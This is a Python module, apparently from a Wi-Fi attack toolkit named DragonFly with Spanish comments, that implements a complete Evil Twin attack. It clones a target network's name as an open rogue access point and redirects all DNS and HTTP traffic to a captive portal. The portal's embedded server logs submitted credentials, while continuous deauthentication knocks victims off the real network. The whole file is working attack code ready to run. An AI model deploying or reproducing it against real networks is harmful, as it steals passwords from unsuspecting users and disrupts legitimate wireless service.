"""
dragonfly/services/evil_twin_service.py - Servicio de ataque Evil Twin y portal cautivo.

Orquesta hostapd, dnsmasq, iptables, el servidor HTTP de captura y el deauth
continuo. El orden importa: la interfaz AP se libera de NetworkManager, se
prepara y se verifica antes de arrancar hostapd; la IP se asigna después, sin
volver a bajar el enlace. El deauth solo se lanza cuando el AP está realmente
activo.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import threading
import time

from dragonfly.config import BASE_DIR_EVIL, DIR_EVIL_PORTALS
from dragonfly.core.network_manager import release_device, restore_device
from dragonfly.core.process_manager import ProcessManager
from dragonfly.core.session import SessionManager
from dragonfly.core.subprocess_utils import safe_popen, safe_run
from dragonfly.core.wifi_interfaces import (
    get_interface_info,
    get_interface_type,
    share_phy,
    supports_ap,
)
from dragonfly.services.wifi_service import WiFiService

GATEWAY = "10.0.0.1"
GATEWAY_CIDR = "10.0.0.1/24"
# El sistema puede tener su propio dnsmasq escuchando en 0.0.0.0:53. Para no
# detenerlo ni reiniciarlo, el DNS cautivo usa un puerto no estándar y las
# consultas de los clientes se redirigen con DNAT.
DNS_PORT = 5354
NAT_CHAIN = "DF_EVIL_NAT"
INPUT_CHAIN = "DF_EVIL_IN"

_CAPTURE_SCRIPT_TEMPLATE = '''#!/usr/bin/env python3
import http.server, urllib.parse, os
from datetime import datetime

LOG = __CRED_LOG__

class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        if parsed_path.query:
            try:
                params = urllib.parse.parse_qs(parsed_path.query)
                with open(LOG, "a") as f:
                    f.write(f"[{datetime.now()}] IP:{self.client_address[0]} DATA_GET:{params}\\n")
                    f.flush(); os.fsync(f.fileno())
            except Exception: pass

        if parsed_path.path == "/":
            self.path = "/index.html"

        local_path = self.translate_path(self.path)
        if not os.path.isfile(local_path):
            if self.path == "/index.html":
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<html><body><h2>Error: index.html no existe.</h2></body></html>")
                return
            self.send_response(302)
            self.send_header("Location", "http://10.0.0.1/index.html")
            self.end_headers()
            return
        return super().do_GET()

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(length).decode("utf-8", "ignore")
            params = urllib.parse.parse_qs(data)
            with open(LOG, "a") as f:
                f.write(f"[{datetime.now()}] IP:{self.client_address[0]} CREDENCIALES:{params}\\n")
                f.flush(); os.fsync(f.fileno())
        except Exception: pass

        self.send_response(302)
        self.send_header("Location", "http://10.0.0.1/success.html")
        self.end_headers()

    def log_message(self, format, *args): pass

if __name__ == "__main__":
    os.chdir(__TMP_WEB__)
    class ThreadedServer(http.server.ThreadingHTTPServer):
        allow_reuse_address = True
    with ThreadedServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd:
        httpd.serve_forever()
'''


class EvilTwinService:
    """
    Gestiona el despliegue del Rogue AP, portal cautivo HTTP y captura de credenciales.
    """

    def __init__(self, process_manager: ProcessManager = None, wifi_service: WiFiService = None):
        self.pm = process_manager or ProcessManager()
        self.wifi = wifi_service or WiFiService(process_manager=self.pm)
        self.is_running = False
        self._stop_event = threading.Event()
        self._worker_thread = None
        self.active_session_dir = None
        self.multi_deauth = None
        self._log_handles = []
        self._iptables_iface = None
        self._tmp_web = None

    # ------------------------------------------------------------------
    # Portales y configuración
    # ------------------------------------------------------------------

    @staticmethod
    def list_portals():
        """
        Escanea la carpeta de portales y retorna aquellos que poseen un index.html válido.
        """
        if not os.path.exists(DIR_EVIL_PORTALS):
            return []
        portales = []
        try:
            for item in os.listdir(DIR_EVIL_PORTALS):
                p_dir = os.path.join(DIR_EVIL_PORTALS, item)
                if os.path.isdir(p_dir) and os.path.exists(os.path.join(p_dir, "index.html")):
                    portales.append(item)
            return sorted(portales)
        except Exception:
            return []

    @staticmethod
    def infer_hw_mode(channel) -> str:
        """``hw_mode=a`` para 5 GHz y ``g`` para 2.4 GHz."""
        try:
            channel_number = int(channel)
        except (TypeError, ValueError):
            channel_number = 1
        return "a" if channel_number > 14 else "g"

    @staticmethod
    def sanitize_ssid(ssid) -> str:
        """Evita saltos de línea que romperían el archivo de hostapd."""
        value = str(ssid or "").replace("\r", " ").replace("\n", " ").strip()
        return value or "FreeWiFi"

    @classmethod
    def build_hostapd_config(cls, ap_iface: str, red_target: dict, channel=None) -> str:
        """Construye una configuración hostapd abierta y válida para la banda."""
        try:
            channel_number = int(channel if channel is not None else red_target.get("ch") or 1)
        except (TypeError, ValueError):
            channel_number = 1
        ssid = cls.sanitize_ssid(red_target.get("essid"))
        lines = [
            f"interface={ap_iface}",
            "driver=nl80211",
            f"ssid={ssid}",
            f"hw_mode={cls.infer_hw_mode(channel_number)}",
            f"channel={channel_number}",
            "macaddr_acl=0",
            "auth_algs=1",
            "wpa=0",
            "ignore_broadcast_ssid=0",
        ]
        if any(ord(char) > 127 for char in ssid):
            lines.append("utf8_ssid=1")
        return "\n".join(lines) + "\n"

    @staticmethod
    def build_dnsmasq_config(ap_iface: str) -> str:
        """DHCP + DNS cautivo limitado a la interfaz del AP.

        El DNS se publica en ``DNS_PORT`` en lugar de 53 porque el sistema puede
        tener dnsmasq/systemd-resolved ocupando el puerto estándar. Las reglas
        DNAT de ``_install_iptables`` redirigen las consultas de los clientes.
        """
        return (
            f"interface={ap_iface}\n"
            "except-interface=lo\n"
            "bind-interfaces\n"
            f"listen-address={GATEWAY}\n"
            f"port={DNS_PORT}\n"
            "dhcp-range=10.0.0.10,10.0.0.250,12h\n"
            f"dhcp-option=3,{GATEWAY}\n"
            f"dhcp-option=6,{GATEWAY}\n"
            f"address=/#/{GATEWAY}\n"
            "no-hosts\n"
            "no-resolv\n"
            "dhcp-authoritative\n"
            "log-dhcp\n"
        )

    # ------------------------------------------------------------------
    # API pública
    # ------------------------------------------------------------------

    def start_evil_twin(self, ap_iface: str, mon_deauth: str, red_target: dict, portal_name: str,
                        deauth_mode: str = "broadcast", cliente_mac: str = None,
                        on_output=None, on_cred=None):
        """
        Inicia el ataque completo de Evil Twin con un punto de acceso falso y deauth en paralelo.
        """
        self._stop_event.clear()
        self.is_running = True

        def runner():
            log = on_output or (lambda _msg: None)
            session_dir = None
            tmp_web = None
            monitors = [mon_deauth] if mon_deauth else []
            try:
                session_dir, tmp_web, cred_log = self._prepare_session(portal_name, log)
                log(f"[*] Iniciando Evil Twin contra: {red_target.get('essid', 'Desconocido')}")
                log(f"[*] Sesión guardada en: {session_dir}")

                self._limpiar_procesos_previos()
                self._cleanup_iptables()

                self._prepare_ap(ap_iface, red_target, monitors, session_dir, log)
                self._start_dnsmasq(ap_iface, session_dir, log)
                self._install_iptables(ap_iface)
                self._start_web(tmp_web, session_dir, log)

                try:
                    self._start_single_deauth(mon_deauth, ap_iface, red_target, deauth_mode, cliente_mac, log)
                except Exception as exc:
                    log(f"[!] AP activo, pero el deauth no está disponible: {exc}")

                log("[+] Rogue AP y servidor cautivo activos.")
                log("[*] Escuchando credenciales entrantes...")
                self._credential_loop(cred_log, log, on_cred)

            except Exception as exc:
                log(f"[!] Evil Twin abortado: {exc}")
            finally:
                self._cleanup(session_dir, ap_iface, monitors, log)
                log("[+] Evil Twin detenido y red restaurada.")
                self.is_running = False

        self._worker_thread = threading.Thread(target=runner, daemon=True)
        self._worker_thread.start()
        return self._worker_thread

    def start_evil_twin_dual(self, ap_iface: str, mon1: str, mon2: str,
                             red_ap: dict, target1: dict, target2: dict, portal_name: str,
                             on_output=None, on_cred=None):
        """
        Inicia Evil Twin con Rogue AP en ap_iface y desautenticación dual en mon1 y mon2.
        """
        self._stop_event.clear()
        self.is_running = True

        def runner():
            log = on_output or (lambda _msg: None)
            session_dir = None
            tmp_web = None
            monitors = [mon1, mon2]
            try:
                if not mon1 or not mon2 or mon1 == mon2:
                    raise RuntimeError("Se requieren dos interfaces de monitor distintas.")
                session_dir, tmp_web, cred_log = self._prepare_session(portal_name, log)
                log(f"[*] Iniciando Evil Twin Dual (AP: {red_ap.get('essid', 'Desconocido')})")
                log(f"[*] Sesión guardada en: {session_dir}")

                self._limpiar_procesos_previos()
                self._cleanup_iptables()

                self._prepare_ap(ap_iface, red_ap, monitors, session_dir, log)
                self._start_dnsmasq(ap_iface, session_dir, log)
                self._install_iptables(ap_iface)
                self._start_web(tmp_web, session_dir, log)

                try:
                    self.multi_deauth = self.wifi.start_dual_deauth(
                        mon1, mon2, target1, target2, burst="0", callback=log
                    )
                except Exception as exc:
                    log(f"[!] AP activo, pero el deauth dual no está disponible: {exc}")

                log("[+] Rogue AP y servidor cautivo activos con Deauth Dual.")
                log("[*] Escuchando credenciales entrantes...")
                self._credential_loop(cred_log, log, on_cred)

            except Exception as exc:
                log(f"[!] Evil Twin Dual abortado: {exc}")
            finally:
                self._cleanup(session_dir, ap_iface, monitors, log)
                log("[+] Evil Twin Dual detenido y red restaurada.")
                self.is_running = False

        self._worker_thread = threading.Thread(target=runner, daemon=True)
        self._worker_thread.start()
        return self._worker_thread

    def stop_evil_twin(self):
        """Envía la señal de parada al ataque Evil Twin."""
        self._stop_event.set()
        if self.multi_deauth:
            try:
                self.multi_deauth.stop()
            except Exception:
                pass
            self.multi_deauth = None
        try:
            self.wifi.stop_deauth_attack()
        except Exception:
            pass
        self.is_running = False

    def wait_until_stopped(self, timeout: float = 25.0) -> bool:
        """Espera a que el hilo de limpieza termine. True si ya no está activo."""
        worker = self._worker_thread
        if worker and worker.is_alive():
            worker.join(timeout)
            return not worker.is_alive()
        return True

    def list_saved_sessions(self):
        """Retorna las sesiones de auditoría de Evil Twin guardadas."""
        return SessionManager.list_sessions(BASE_DIR_EVIL)

    def read_credentials(self, session_name: str) -> str:
        """Lee el archivo credentials.log de una sesión."""
        log_file = os.path.join(BASE_DIR_EVIL, session_name, "credentials.log")
        return SessionManager.read_file(log_file)

    # ------------------------------------------------------------------
    # Preparación de la sesión y del AP
    # ------------------------------------------------------------------

    def _prepare_session(self, portal_name: str, log):
        """Crea la sesión, copia el portal y genera el servidor de captura."""
        portal_source = os.path.join(DIR_EVIL_PORTALS, portal_name)
        if not os.path.isdir(portal_source) or not os.path.isfile(os.path.join(portal_source, "index.html")):
            raise RuntimeError(f"El portal '{portal_name}' no existe o no contiene index.html.")

        session_dir = SessionManager.create_session(BASE_DIR_EVIL)
        self.active_session_dir = session_dir
        timestamp = os.path.basename(session_dir).replace("Auditoria-", "")
        tmp_web = f"/tmp/evil_twin_web_{timestamp}"
        self._tmp_web = tmp_web
        os.makedirs(tmp_web, exist_ok=True)
        shutil.copytree(portal_source, tmp_web, dirs_exist_ok=True)

        cred_log = os.path.join(session_dir, "credentials.log")
        capture_script = (
            _CAPTURE_SCRIPT_TEMPLATE
            .replace("__CRED_LOG__", json.dumps(cred_log))
            .replace("__TMP_WEB__", json.dumps(tmp_web))
        )
        with open(os.path.join(tmp_web, "capture.py"), "w") as handle:
            handle.write(capture_script)

        success_path = os.path.join(tmp_web, "success.html")
        if not os.path.exists(success_path):
            with open(success_path, "w") as handle:
                handle.write(
                    '<html><body style="background:#0b1a2a;color:#fff;text-align:center;'
                    'font-family:sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2>'
                    '<p>Ya puede cerrar esta ventana.</p></body></html>'
                )

        return session_dir, tmp_web, cred_log

    def _prepare_ap(self, ap_iface: str, red_target: dict, monitor_ifaces, session_dir: str, log):
        """Libera, prepara y verifica la interfaz AP antes de arrancar hostapd."""
        if not ap_iface:
            raise RuntimeError("No hay interfaz AP seleccionada.")
        if not supports_ap(ap_iface):
            raise RuntimeError(f"{ap_iface} no soporta modo AP.")
        for monitor in monitor_ifaces:
            if monitor and (monitor == ap_iface or share_phy(monitor, ap_iface)):
                raise RuntimeError(
                    f"{ap_iface} y {monitor} comparten la misma radio. "
                    "Use dos adaptadores independientes para AP + monitor."
                )

        if not release_device(ap_iface):
            log(f"[!] NetworkManager no confirmó la liberación de {ap_iface}; se intentará igualmente.")

        # Dejar la interfaz limpia y abajo: hostapd la subirá en modo AP.
        safe_run(["sudo", "ip", "link", "set", ap_iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "iw", "dev", ap_iface, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)

        hostapd_conf = os.path.join(session_dir, "hostapd.conf")
        with open(hostapd_conf, "w") as handle:
            handle.write(self.build_hostapd_config(ap_iface, red_target))

        log_path = os.path.join(session_dir, "hostapd.log")
        proc = self._start_logged("hostapd", ["sudo", "hostapd", hostapd_conf], log_path)
        ok, detail = self._wait_for_hostapd(proc, ap_iface, red_target.get("essid"), log_path)
        if not ok:
            self.pm.terminate_proc("hostapd", timeout=2)
            last_line = self._last_line(detail)
            raise RuntimeError(f"hostapd no pudo activar el AP en {ap_iface}.{last_line}")

        # La IP se asigna con el AP ya activo y SIN bajar el enlace.
        safe_run(["sudo", "ip", "link", "set", ap_iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        result = safe_run(
            ["sudo", "ip", "addr", "replace", GATEWAY_CIDR, "dev", ap_iface],
            capture_output=True,
            text=True,
            timeout=4,
        )
        if result.returncode != 0:
            raise RuntimeError(f"No se pudo asignar {GATEWAY_CIDR} a {ap_iface}: {(result.stderr or '').strip()}")

        channel = red_target.get("ch", "?")
        mode = self.infer_hw_mode(channel)
        log(f"[+] AP '{self.sanitize_ssid(red_target.get('essid'))}' activo en {ap_iface} "
            f"(canal {channel}, hw_mode={mode}).")

    def _wait_for_hostapd(self, proc, ap_iface: str, ssid, log_path: str, timeout: float = 12.0):
        """Espera a que hostapd anuncie AP-ENABLED o a que la interfaz sea tipo AP."""
        expected_ssid = self.sanitize_ssid(ssid)
        deadline = time.monotonic() + timeout
        last_log = ""
        while time.monotonic() < deadline:
            if proc.poll() is not None:
                return False, self._read_log(log_path)

            last_log = self._read_log(log_path)
            if "AP-ENABLED" in last_log:
                return True, last_log

            info = get_interface_info(ap_iface)
            if info.get("type") == "ap":
                current_ssid = info.get("ssid")
                if not current_ssid or current_ssid == expected_ssid:
                    return True, last_log
            elif get_interface_type(ap_iface) is None:
                # Sin iw no se puede verificar el tipo: dar un margen a hostapd.
                if "AP-ENABLED" in last_log:
                    return True, last_log
            time.sleep(0.5)
        return False, last_log

    def _start_dnsmasq(self, ap_iface: str, session_dir: str, log):
        """Arranca dnsmasq con configuración propia y verifica que siga vivo."""
        self.pm.terminate_proc("dnsmasq", timeout=2)
        # Limpieza dirigida de instancias huérfanas de ejecuciones anteriores.
        ProcessManager.pkill("dnsmasq_evil.conf", full=True)
        ProcessManager.pkill(r"dnsmasq .*Auditoria-[^ ]*/dnsmasq\.conf", full=True)

        conf_path = os.path.join(session_dir, "dnsmasq.conf")
        with open(conf_path, "w") as handle:
            handle.write(self.build_dnsmasq_config(ap_iface))

        log_path = os.path.join(session_dir, "dnsmasq.log")
        proc = self._start_logged("dnsmasq", ["sudo", "dnsmasq", "-C", conf_path, "-d"], log_path)
        time.sleep(1.2)
        if proc.poll() is not None:
            detail = self._read_log(log_path)
            hint = ""
            if "address already in use" in detail.lower():
                hint = (
                    f" Otro servicio está usando el puerto DNS {DNS_PORT} "
                    "o el puerto DHCP 67."
                )
            raise RuntimeError(f"dnsmasq terminó al iniciar.{hint}{self._last_line(detail)}")
        log("[+] dnsmasq activo (DHCP + DNS cautivo).")

    def _start_web(self, tmp_web: str, session_dir: str, log):
        """Arranca el servidor HTTP de captura y verifica que escuche."""
        capture_script = os.path.join(tmp_web, "capture.py")
        if not os.path.isfile(capture_script):
            raise RuntimeError("No se generó el servidor de captura.")

        log_path = os.path.join(session_dir, "web.log")
        python = sys.executable or "python3"
        proc = self._start_logged("web_server", ["sudo", python, capture_script], log_path)
        time.sleep(1.0)
        if proc.poll() is not None:
            detail = self._read_log(log_path)
            hint = ""
            if "address already in use" in detail.lower() or "errno 98" in detail.lower():
                hint = " Otro proceso está usando el puerto 80."
            raise RuntimeError(f"El servidor web cautivo terminó al iniciar.{hint}{self._last_line(detail)}")
        log("[+] Servidor web cautivo activo en el puerto 80.")

    # ------------------------------------------------------------------
    # Deauth
    # ------------------------------------------------------------------

    def _start_single_deauth(self, mon_deauth, ap_iface, red_target, deauth_mode, cliente_mac, log):
        if not mon_deauth:
            raise RuntimeError("No hay interfaz de monitor para el deauth.")
        if mon_deauth == ap_iface or share_phy(mon_deauth, ap_iface):
            raise RuntimeError(f"{mon_deauth} comparte radio con {ap_iface}.")
        if deauth_mode == "directed" and cliente_mac:
            log(f"[*] Deauth dirigido al cliente: {cliente_mac}")
        else:
            log("[*] Deauth en modo broadcast (todos los clientes).")
        self.wifi.start_deauth_attack(
            mon_iface=mon_deauth,
            target_red=red_target,
            cliente_mac=cliente_mac if deauth_mode == "directed" else None,
            count="0",
            on_output=log,
        )

    # ------------------------------------------------------------------
    # Iptables (cadenas propias, sin flush global)
    # ------------------------------------------------------------------

    @staticmethod
    def _iptables(*args, table=None, timeout=5):
        cmd = ["sudo", "iptables", "-w", "5"]
        if table:
            cmd.extend(["-t", table])
        cmd.extend(args)
        return safe_run(cmd, capture_output=True, text=True, timeout=timeout)

    def _chain_exists(self, table: str, chain: str) -> bool:
        result = self._iptables("-n", "-L", chain, table=table)
        return result.returncode == 0

    def _ensure_chain(self, table: str, chain: str):
        if not self._chain_exists(table, chain):
            result = self._iptables("-N", chain, table=table)
            if result.returncode != 0 and not self._chain_exists(table, chain):
                raise RuntimeError(f"No se pudo crear la cadena iptables {chain}: {(result.stderr or '').strip()}")

    def _insert_jump(self, table: str, parent: str, iface: str, chain: str):
        check = self._iptables("-C", parent, "-i", iface, "-j", chain, table=table)
        if check.returncode != 0:
            result = self._iptables("-I", parent, "1", "-i", iface, "-j", chain, table=table)
            if result.returncode != 0:
                raise RuntimeError(f"No se pudo enlazar {parent} -> {chain}: {(result.stderr or '').strip()}")

    def _install_iptables(self, ap_iface: str):
        """Redirige HTTP/DNS y permite DHCP en cadenas propias de DragonFly."""
        self._iptables_iface = ap_iface
        self._ensure_chain("nat", NAT_CHAIN)
        self._ensure_chain("filter", INPUT_CHAIN)
        self._iptables("-F", NAT_CHAIN, table="nat")
        self._iptables("-F", INPUT_CHAIN, table="filter")

        self._iptables(
            "-A", NAT_CHAIN, "-p", "tcp", "--dport", "80",
            "-j", "DNAT", "--to-destination", f"{GATEWAY}:80",
            table="nat",
        )
        for protocol in ("udp", "tcp"):
            self._iptables(
                "-A", NAT_CHAIN, "-p", protocol, "--dport", "53",
                "-j", "DNAT", "--to-destination", f"{GATEWAY}:{DNS_PORT}",
                table="nat",
            )
        self._iptables(
            "-A", INPUT_CHAIN, "-m", "conntrack", "--ctstate", "RELATED,ESTABLISHED",
            "-j", "ACCEPT", table="filter",
        )
        for protocol, port in (
            ("tcp", "80"),
            ("tcp", "53"),
            ("udp", "53"),
            ("tcp", str(DNS_PORT)),
            ("udp", str(DNS_PORT)),
            ("udp", "67"),
        ):
            self._iptables(
                "-A", INPUT_CHAIN, "-p", protocol, "--dport", port,
                "-j", "ACCEPT", table="filter",
            )

        self._insert_jump("nat", "PREROUTING", ap_iface, NAT_CHAIN)
        self._insert_jump("filter", "INPUT", ap_iface, INPUT_CHAIN)

    def _delete_jumps(self, table: str, parent: str, chain: str):
        """Borra cualquier regla de ``parent`` que salte a nuestra cadena."""
        result = self._iptables("-S", parent, table=table)
        if result.returncode != 0:
            return
        for line in (result.stdout or "").splitlines():
            if f"-j {chain}" not in line:
                continue
            parts = line.split()
            if not parts or parts[0] != "-A":
                continue
            self._iptables("-D", *parts[1:], table=table)

    def _cleanup_iptables(self):
        """Elimina solo las cadenas y saltos creados por DragonFly."""
        for table, parent, chain in (
            ("nat", "PREROUTING", NAT_CHAIN),
            ("filter", "INPUT", INPUT_CHAIN),
        ):
            self._delete_jumps(table, parent, chain)
            self._iptables("-F", chain, table=table)
            self._iptables("-X", chain, table=table)
        self._iptables_iface = None

    # ------------------------------------------------------------------
    # Bucle de credenciales y limpieza
    # ------------------------------------------------------------------

    def _credential_loop(self, cred_log: str, log, on_cred):
        last_lines = 0
        warned = set()
        while not self._stop_event.is_set():
            time.sleep(2)
            if not self.pm.is_running("hostapd"):
                log("[!] hostapd se detuvo inesperadamente; cerrando Evil Twin.")
                break
            for name in ("dnsmasq", "web_server"):
                if name not in warned and not self.pm.is_running(name):
                    warned.add(name)
                    log(f"[!] {name} se detuvo; el portal puede estar incompleto.")

            if not os.path.exists(cred_log):
                continue
            try:
                with open(cred_log, "r") as handle:
                    lines = handle.readlines()
            except OSError:
                continue
            if len(lines) > last_lines:
                for line in lines[last_lines:]:
                    cleaned = line.strip()
                    if not cleaned:
                        continue
                    log(f"[+] Credencial: {cleaned}")
                    if on_cred:
                        on_cred(cleaned)
                last_lines = len(lines)

    def _cleanup(self, session_dir, ap_iface: str, monitor_ifaces, log):
        """Detiene todo, restaura interfaces y elimina las reglas propias."""
        self._stop_event.set()

        try:
            self.wifi.stop_deauth_attack()
        except Exception:
            pass
        if self.multi_deauth:
            try:
                self.multi_deauth.stop()
            except Exception:
                pass
            self.multi_deauth = None

        for name in ("deauth", "web_server", "dnsmasq", "hostapd"):
            try:
                self.pm.terminate_proc(name, timeout=3)
            except Exception:
                pass

        self._cleanup_iptables()
        self._close_logs()

        for monitor in monitor_ifaces or []:
            if not monitor:
                continue
            try:
                self.wifi.disable_monitor_mode(monitor)
            except Exception as exc:
                log(f"[!] No se pudo restaurar {monitor}: {exc}")

        self._restore_ap_interface(ap_iface, log)

        if self._tmp_web:
            shutil.rmtree(self._tmp_web, ignore_errors=True)
            self._tmp_web = None

    def _restore_ap_interface(self, ap_iface: str, log):
        """Devuelve la interfaz AP a modo managed y a NetworkManager."""
        if not ap_iface:
            return
        safe_run(["sudo", "ip", "link", "set", ap_iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "iw", "dev", ap_iface, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "ip", "link", "set", ap_iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        if restore_device(ap_iface):
            log(f"[+] {ap_iface} devuelta a NetworkManager.")
        else:
            log(f"[!] No se pudo devolver {ap_iface} a NetworkManager.")

    # ------------------------------------------------------------------
    # Utilidades de procesos y logs
    # ------------------------------------------------------------------

    def _start_logged(self, name: str, cmd, log_path: str):
        """Lanza un proceso redirigiendo stdout/stderr a un log de la sesión."""
        handle = open(log_path, "ab", buffering=0)
        try:
            proc = safe_popen(cmd, stdout=handle, stderr=subprocess.STDOUT)
        except Exception:
            handle.close()
            raise
        self._log_handles.append(handle)
        self.pm.register(name, proc)
        return proc

    def _close_logs(self):
        for handle in self._log_handles:
            try:
                handle.close()
            except Exception:
                pass
        self._log_handles.clear()

    @staticmethod
    def _read_log(path: str) -> str:
        try:
            with open(path, "r", errors="replace") as handle:
                return handle.read()
        except OSError:
            return ""

    @staticmethod
    def _last_line(text: str) -> str:
        for line in reversed((text or "").splitlines()):
            cleaned = line.strip()
            if cleaned:
                return f" Detalle: {cleaned}"
        return ""

    def _limpiar_procesos_previos(self):
        """Mata solo procesos huérfanos propios de ataques anteriores."""
        for name in ("deauth_active", "deauth", "web_server", "dnsmasq", "hostapd"):
            try:
                self.pm.terminate_proc(name, timeout=2)
            except Exception:
                pass

        # Patrones dirigidos: no se toca un hostapd/dnsmasq ajeno al ataque.
        ProcessManager.pkill("hostapd_evil.conf", full=True)
        ProcessManager.pkill(r"hostapd .*Auditoria-[^ ]*/hostapd\.conf", full=True)
        ProcessManager.pkill("dnsmasq_evil.conf", full=True)
        ProcessManager.pkill(r"dnsmasq .*Auditoria-[^ ]*/dnsmasq\.conf", full=True)
        ProcessManager.pkill("capture.py", full=True)
        ProcessManager.pkill(r"aireplay-ng .*--deauth", full=True)
